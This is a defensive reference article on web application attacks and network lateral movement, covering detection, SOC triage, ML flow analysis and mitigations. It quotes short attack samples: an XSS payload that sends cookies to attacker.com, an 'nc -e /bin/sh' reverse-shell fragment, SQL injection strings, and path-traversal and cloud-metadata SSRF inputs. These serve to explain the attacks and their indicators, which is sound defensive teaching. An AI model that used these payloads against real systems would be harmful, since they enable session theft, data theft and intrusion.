# Web Attacks, Infiltration & Lateral Movement

## Overview
Web application attacks exploit vulnerabilities in HTTP/HTTPS software layers (OWASP Top 10) to compromise web services, extract backend data, or obtain initial network access.

Following initial compromise, adversaries execute Infiltration and Lateral Movement (MITRE ATT&CK T1210 / T1021) to expand their presence across enterprise internal network segments, escalate privileges, and reach high-value targets such as domain controllers, database servers, or backup systems.

Together, these two stages represent a common attack arc: **gain a foothold via a web-facing vulnerability → move laterally inside the network → reach and compromise critical assets.**

---

## Definition

- **Web Application Attack:** An attack that targets the logic, input handling, or configuration of a web application (as opposed to the underlying operating system or network stack directly).
- **Infiltration:** The stage of an attack following initial access, in which an adversary establishes a durable presence inside the target environment (e.g., installing backdoors, creating new accounts, deploying implants).
- **Lateral Movement:** Techniques attackers use to move from an initially compromised host to other systems within the same network, typically to reach higher-value targets or broaden access.
- **Exfiltration:** The unauthorized transfer of data out of the compromised environment, often the ultimate objective following successful infiltration and lateral movement.
- **Foothold:** The first compromised asset an attacker controls inside a target network, used as a launch point for further activity.

**Alternative / related terminology:** web exploitation, application-layer attack, internal network compromise, network pivoting, east-west movement (as opposed to north-south perimeter traffic), post-exploitation.

---

## Key Concepts

### Why Web Applications Are a Common Entry Point
Web servers are frequently exposed to the public internet by necessity, giving attackers a directly reachable attack surface without needing to breach network perimeter defenses first. A single unpatched or poorly coded endpoint can provide a path from "outside the network" to "inside the network."

### The Kill-Chain Relationship
Web attacks and infiltration/lateral movement typically map onto adjacent stages of a broader attack lifecycle (conceptually aligned with models such as the Lockheed Martin Cyber Kill Chain or MITRE ATT&CK tactics):
1. **Initial Access** — exploiting a web vulnerability (e.g., SQL injection, RCE) to gain a foothold.
2. **Execution / Persistence** — installing a web shell or backdoor to survive reboots and maintain access.
3. **Privilege Escalation** — exploiting local misconfigurations or vulnerabilities to gain higher-privileged accounts.
4. **Lateral Movement** — using stolen credentials or exploited services to reach additional hosts.
5. **Collection & Exfiltration** — locating and extracting valuable data.

### Internal ("East-West") vs. Perimeter ("North-South") Traffic
Traditional network defenses are heavily weighted toward inspecting traffic crossing the perimeter (north-south). Lateral movement occurs in east-west traffic — between internal hosts — which is often less scrutinized, making internal network visibility (via flow monitoring, EDR, and internal segmentation) essential for catching post-compromise activity.

---

## Technical Details

## Key Web Application Attack Vectors

### 1. SQL Injection (SQLi - OWASP A03:2021)
- **Mechanism:** Inserting untrusted SQL syntax into input fields (e.g., `' OR '1'='1' --`) to manipulate database query logic, bypass authentication, or dump database contents (`UNION SELECT`).
- **Indicators:** High prevalence of SQL keywords (`SELECT`, `UNION`, `CONCAT`, `information_schema`) inside HTTP request parameters or URIs.
- **Variants:** Error-based SQLi (leveraging verbose database error messages), Union-based SQLi (combining results via `UNION SELECT`), Blind Boolean-based SQLi (inferring data from true/false page responses), and Time-based Blind SQLi (inferring data from induced response delays, e.g., `SLEEP(5)`).

### 2. Cross-Site Scripting (XSS - OWASP A03:2021)
- **Mechanism:** Injecting malicious JavaScript payloads (e.g., `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`) executed within a victim user's browser context.
- **Types:** Stored XSS, Reflected XSS, DOM-based XSS.
- **Impact:** Session/cookie theft, credential harvesting via fake forms, browser-based keylogging, and drive-by redirection to malicious sites.

### 3. Command Injection & Remote Code Execution (RCE)
- **Mechanism:** Appending shell metacharacters (`;`, `&&`, `|`, `$(...)`) into backend operating system command executions to spawn reverse shells (`nc -e /bin/sh`).
- **Impact:** Full remote control of the underlying server, often the most severe class of web vulnerability since it grants direct OS-level access.

### 4. Path Traversal & Local File Inclusion (LFI)
- **Mechanism:** Supplying directory climbing sequences (`../../../../etc/passwd` or `..\..\..\windows\system32\cmd.exe`) to access unauthorized server filesystem resources.
- **Related:** Remote File Inclusion (RFI), where an attacker causes the server to load and execute a file hosted on an attacker-controlled remote server.

### 5. Server-Side Request Forgery (SSRF - OWASP A10:2021)
- **Mechanism:** Tricking a server into making HTTP requests to unintended destinations, often internal-only services (e.g., `http://169.254.169.254/latest/meta-data/` to reach cloud instance metadata endpoints) that are not directly reachable from outside.
- **Impact:** Can expose internal services, cloud credentials, or be chained into further internal network reconnaissance.

### 6. XML External Entity (XXE) Injection
- **Mechanism:** Exploiting XML parsers that process external entity references, allowing an attacker to read local files, perform SSRF, or cause denial of service via entity expansion ("billion laughs" attack).

### 7. Insecure Deserialization
- **Mechanism:** Supplying malicious serialized objects to an application that deserializes untrusted input, potentially leading to remote code execution when the deserialization process instantiates attacker-controlled object graphs.

### 8. Cross-Site Request Forgery (CSRF)
- **Mechanism:** Tricking an authenticated victim's browser into submitting an unwanted request to a web application in which they are currently authenticated, exploiting the browser's automatic inclusion of session cookies.
- **Mitigating factor:** Modern anti-CSRF tokens and `SameSite` cookie attributes have reduced, though not eliminated, this attack's prevalence.

---

## Infiltration & Lateral Movement Vectors

### 1. SMB / RPC Exploitation (e.g., EternalBlue MS17-010)
- Exploiting vulnerabilities in Windows SMBv1/v2 (port 445) to execute kernel-level code and pivot across Windows domain controllers and workstations without credentials.

### 2. Pass-the-Hash & Pass-the-Ticket (T1550)
- Reusing captured NTLM hashes or Kerberos tickets to authenticate to adjacent network hosts over SMB/WinRM without cracking the plaintext password.

### 3. Remote Services & Protocols
- Using valid stolen credentials across SSH (port 22), RDP (port 3389), WinRM (ports 5985/5986), or WMI.

### 4. Web Shells & Backdoors
- Following successful RCE or file-upload exploitation, attackers frequently deploy a **web shell** — a small script (PHP, JSP, ASPX) placed on the compromised web server — providing a persistent, browser-accessible command interface for further exploitation and pivoting.

### 5. Living-off-the-Land (LotL) Techniques
- Abusing legitimate, pre-installed administrative tools (e.g., PowerShell, WMIC, PsExec, certutil) to perform lateral movement and execution, which helps evade detection because the tools themselves are not inherently malicious.

### 6. Credential Harvesting for Pivoting
- Dumping credentials from memory (e.g., via tools that access LSASS process memory) or configuration files to obtain additional accounts usable for further lateral movement.

---

## Detection

- **Web-layer detection:** Inspecting HTTP request bodies, headers, and URIs for known malicious patterns (SQL keywords, script tags, path traversal sequences), abnormal request rates from a single source, and unusual User-Agent strings.
- **Lateral-movement detection:** Monitoring for atypical internal authentication patterns — a single account authenticating to many hosts in a short window, off-hours administrative logins, or use of administrative protocols (SMB, WinRM, RDP) between hosts that do not normally communicate.
- **Web shell detection:** File integrity monitoring on web server directories to flag newly created or modified script files, and detecting HTTP requests with encoded/obfuscated parameters characteristic of web shell command execution.

---

## Network Indicators

- **Elevated HTTP Error Rates:** A surge in HTTP 500 (server error) or 400 (bad request) responses can indicate exploitation attempts that are triggering unhandled application errors.
- **Anomalous Request Payload Size/Content:** Web attack payloads (SQLi, XSS strings) frequently produce request bodies or URIs with atypical length or character composition (e.g., high frequency of special characters like `'`, `<`, `;`, `../`).
- **East-West Flow Spikes:** A host that normally only communicates with a handful of servers suddenly establishing SMB (445), RDP (3389), or WinRM (5985/5986) sessions with many other internal hosts — a classic lateral-movement flow signature.
- **New Internal Destination Pairs:** Communication between two internal hosts that have never previously communicated is a useful anomaly signal for lateral movement, since attacker pivoting often creates novel host-to-host relationships.
- **Repeated Authentication Failures Followed by Success:** A pattern consistent with credential-stuffing or pass-the-hash attempts against internal services.
- **CICIDS/NSL-KDD Correlates:** Web attack traffic in CICIDS-2017 typically shows elevated `Flow Bytes/s` for POST-heavy exploitation attempts, and infiltration flows often show unusual `Fwd/Bwd Packet Length` asymmetries consistent with file transfer or backdoor payload delivery.

---

## Machine Learning Perspective

*(General knowledge — how ML approaches these traffic categories conceptually.)*

- **Web attack classification:** Flow-based features (packet counts, byte counts, flow duration) can capture some web attack behavior (e.g., large upload requests for injection payloads), but full detection of many web attacks (SQLi, XSS) often benefits from complementary payload/content inspection, since attack intent is frequently expressed in the request body rather than in flow-level statistics alone.
- **Infiltration/lateral movement as anomaly detection:** Because lateral movement often uses **legitimate protocols and even legitimate credentials**, it is frequently better suited to behavioral/anomaly-based modeling (learning what "normal" internal communication patterns look like) than to signature-based classification.
- **Random Forest and feature importance:** For flow-based lateral movement detection, Random Forest models can help identify which features (e.g., novel destination host, protocol, time-of-day) most strongly indicate deviation from an internal host's typical behavior.
- **Class imbalance and rarity:** Both web attacks and infiltration events are typically rare relative to total traffic volume, requiring imbalance-aware evaluation (precision, recall, F1) rather than raw accuracy.
- **False negative risk:** Because lateral movement can closely mimic legitimate administrative activity, false negatives (missed detections) are a persistent challenge, underscoring the value of layering ML-based flow analysis with endpoint telemetry and log correlation.

---

## SOC Perspective

### Investigating a Suspected Web Attack
1. Review web server / WAF logs for the flagged source IP and request pattern.
2. Determine whether the payload appears to have executed successfully (e.g., database error responses, unexpected data returned, files created on disk).
3. Check whether the targeted endpoint is internet-facing and what data/systems it can access.
4. Cross-reference the source IP against threat intelligence and prior scanning/reconnaissance activity from the same origin.

### Investigating Suspected Lateral Movement
1. Identify the initially compromised ("patient zero") host and establish a timeline of its subsequent internal connections.
2. Determine which accounts were used for each internal authentication and whether their use is consistent with normal job function and working hours.
3. Map every host the compromised credential/account touched to establish the scope of potential compromise.
4. Look for signs of privilege escalation (new administrative accounts, changes to group memberships) that would expand the impact of the incident.
5. Prioritize protecting and isolating high-value assets (domain controllers, backup servers, database servers) that appear to be the likely eventual target.

---

## Examples

- **SQL Injection Attempt:** A login form submission contains `' UNION SELECT username, password FROM users --` — the presence of `UNION SELECT` alongside SQL comment syntax (`--`) is a strong web-attack indicator.
- **Reflected XSS Probe:** A URL parameter containing `<script>alert(document.cookie)</script>` submitted repeatedly across different endpoints, consistent with automated vulnerability scanning.
- **Lateral Movement via Pass-the-Hash:** A workstation account that normally only authenticates to one file server suddenly authenticates via SMB to a dozen other workstations within minutes — inconsistent with typical user behavior and suggestive of hash-based pivoting.
- **Web Shell Deployment:** A new `.php` file appears in a web server's upload directory shortly after a file-upload endpoint received an unusually crafted multipart request, followed by repeated GET requests to that new file with encoded query parameters.

---

## Defensive Mitigation Strategies

### Web Application Protection
1. **Parameterized Queries / Prepared Statements:** Mandatory use of parameterized SQL APIs (e.g., PDO in PHP, parameterized ORMs) to guarantee input is treated strictly as data, not executable code.
2. **Web Application Firewall (WAF):** Deploy OWASP Core Rule Set (CRS) on ModSecurity, AWS WAF, or Cloudflare WAF to inspect L7 traffic payloads and block attack patterns.
3. **Content Security Policy (CSP):** Enforce strict CSP headers (`Content-Security-Policy: default-src 'self'; script-src 'self'`) to neutralize XSS execution.
4. **Input Validation & Output Encoding:** Validate input against strict allow-lists where possible, and encode output appropriately for its context (HTML, JavaScript, URL) to prevent injection.
5. **Least-Privilege Database Accounts:** Ensure the application's database account only has the permissions it strictly requires, limiting the blast radius of a successful SQLi.

### Lateral Movement Countermeasures
1. **Network Micro-Segmentation:** Isolate internal endpoints; disallow workstation-to-workstation lateral communications over ports 445 (SMB), 135 (RPC), and 3389 (RDP).
2. **Privileged Access Management (PAM):** Implement Tiered Administration models (Tier 0 Domain Controllers, Tier 1 Servers, Tier 2 Workstations) ensuring Tier 0 credentials never touch lower-tier systems.
3. **Disable SMBv1:** Eliminate legacy SMBv1 protocols across all domain systems.
4. **Credential Hygiene:** Enforce unique local administrator passwords per host (e.g., LAPS-style rotation) to prevent a single stolen hash from unlocking many machines.
5. **Internal Network Monitoring:** Extend flow and log monitoring beyond the perimeter to internal east-west traffic, since lateral movement is invisible to perimeter-only defenses.

---

## Limitations

- **Encrypted HTTPS payloads:** Without TLS termination/inspection, flow-based tools cannot directly read HTTP request bodies, limiting visibility into payload-level web attack indicators.
- **Legitimate-looking lateral movement:** Because attackers frequently reuse valid credentials and standard administrative protocols, distinguishing malicious lateral movement from legitimate IT administration activity purely from network flows can be difficult and requires contextual/behavioral baselining.
- **WAF and signature evasion:** Attackers routinely use encoding, obfuscation, and payload fragmentation to evade signature-based WAF rules.
- **Dataset representativeness:** Flow-based benchmark datasets capture a snapshot of attack techniques at the time of collection and may not reflect newer web exploitation frameworks or lateral movement tradecraft.
- **Scope of flow-only models:** Flow-level features alone generally cannot fully characterize sophisticated multi-stage infiltration; they are best used as one layer within a broader detection strategy that includes endpoint and log-based telemetry.

---

## Common Questions

**Q: What is the difference between a web attack and lateral movement?**
A: A web attack exploits a vulnerability in a web application (e.g., SQL injection, XSS) typically to gain initial access, while lateral movement refers to an attacker's subsequent efforts to move from that initial foothold to other systems inside the network.

**Q: What is SQL Injection?**
A: SQL Injection is a web attack in which untrusted input is inserted into SQL query logic, allowing an attacker to manipulate database queries, bypass authentication, or extract data they should not have access to.

**Q: What is a web shell?**
A: A web shell is a small malicious script placed on a compromised web server that gives an attacker a persistent, browser-accessible interface for executing further commands on the server.

**Q: What is Pass-the-Hash?**
A: Pass-the-Hash is a lateral movement technique where an attacker reuses a captured password hash to authenticate to other systems without needing to know or crack the actual plaintext password.

**Q: Why is internal ("east-west") traffic monitoring important?**
A: Because lateral movement occurs between internal hosts rather than across the network perimeter, and perimeter-focused defenses alone will not see an attacker moving from one already-compromised internal host to another.

**Q: Can machine learning detect SQL injection from network flow data alone?**
A: Flow-based statistical features can pick up on some indirect signs (e.g., unusual request sizes), but fully detecting content-based attacks like SQL injection generally benefits from inspecting request payload content in addition to flow statistics, since attack intent is often embedded in the request body rather than reflected purely in flow-level metrics.

**Q: What makes lateral movement hard to detect?**
A: Attackers frequently use valid, stolen credentials and legitimate administrative protocols (SMB, RDP, WinRM) that closely resemble normal IT activity, so distinguishing malicious use from legitimate use requires behavioral baselining and contextual analysis rather than simple signature matching.

---

## Summary
Web attacks (SQL injection, XSS, RCE, path traversal, SSRF, XXE, insecure deserialization, and CSRF) exploit the application layer to gain initial access to a network, most often via internet-facing services. Once inside, adversaries use infiltration and lateral movement techniques — SMB/RPC exploitation, Pass-the-Hash, abuse of remote administration protocols, web shells, and living-off-the-land tooling — to expand their foothold toward high-value internal targets. Because lateral movement frequently mimics legitimate administrative activity, detection depends on behavioral baselining of internal ("east-west") traffic alongside web-layer signature and anomaly detection, with SOC analysts correlating flow data, authentication logs, and endpoint telemetry to establish the true scope of a compromise. Defense-in-depth — parameterized queries, WAFs, CSP, network micro-segmentation, tiered privileged access, and internal monitoring — remains the most effective general-knowledge countermeasure across both stages.
